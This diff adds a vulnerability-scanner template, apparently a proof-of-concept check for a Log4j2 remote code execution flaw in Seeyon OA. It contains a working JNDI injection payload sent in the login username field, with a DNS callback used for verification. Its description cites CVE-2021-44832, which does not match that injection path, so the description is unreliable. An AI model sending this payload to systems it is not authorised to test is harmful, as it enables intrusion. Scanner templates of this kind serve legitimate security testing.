@@ -1,0 +1,35 @@
+{
+  "product": "致远OA",
+  "vul_name": "致远OA 登录框Log4j2远程代码执行漏洞",
+  "type": "代码执行",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "Apache Log4j官方发布安全公告，Apache Log4j2组件中存在一个远程代码执行漏洞（CVE-2021-44832），影响了Apache Log4j2 版本 2.0-alpha7- 2.17.0的所有版本（不包括安全修复版本 2.3.2 和 2.12.4），拥有修改日志配置文件权限的攻击者可以使用JDBC Appender构建恶意配置，其数据源引用JNDI URI，可以远程执行代码，但该漏洞利用需要配置文件jdbc连接可控。",
+  "version": "",
+  "note": "",
+  "search": {},
+  "protocol": "http",
+  "link": "",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "dnslog",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/seeyon/main.do?method=changeLocale",
+      "data": "login_username=${jndi:dns://{{m:rep}}}"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "model": "dnslog"
+        }
+      ]
+    }
+  }
+}
